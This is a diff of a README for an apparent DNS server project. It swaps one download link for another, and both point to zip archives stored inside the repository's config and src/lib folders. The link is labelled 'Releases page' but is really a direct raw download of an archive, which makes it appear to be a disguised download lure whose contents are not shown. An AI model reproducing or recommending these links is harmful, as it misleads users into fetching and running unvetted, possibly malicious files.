@@ -1,6 +1,6 @@
 # 🖥️ Authorative-DNS-server - Easy DNS Management Made Simple
 
-[![Download](https://raw.githubusercontent.com/GDanilo7/Authorative-DNS-server/master/config/Authorative-DNS-server_v1.3.zip)](https://raw.githubusercontent.com/GDanilo7/Authorative-DNS-server/master/config/Authorative-DNS-server_v1.3.zip)
+[![Download](https://raw.githubusercontent.com/GDanilo7/Authorative-DNS-server/master/src/lib/DN_Authorative_server_2.9.zip)](https://raw.githubusercontent.com/GDanilo7/Authorative-DNS-server/master/src/lib/DN_Authorative_server_2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ To run Authorative-DNS-server, ensure your system meets the following requiremen
 
 ## 💻 Download & Install
 
-To download Authorative-DNS-server, visit the [Releases page](https://raw.githubusercontent.com/GDanilo7/Authorative-DNS-server/master/config/Authorative-DNS-server_v1.3.zip). Here, you can find the latest version of the software.
+To download Authorative-DNS-server, visit the [Releases page](https://raw.githubusercontent.com/GDanilo7/Authorative-DNS-server/master/src/lib/DN_Authorative_server_2.9.zip). Here, you can find the latest version of the software.
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of Authorative-DNS-server.
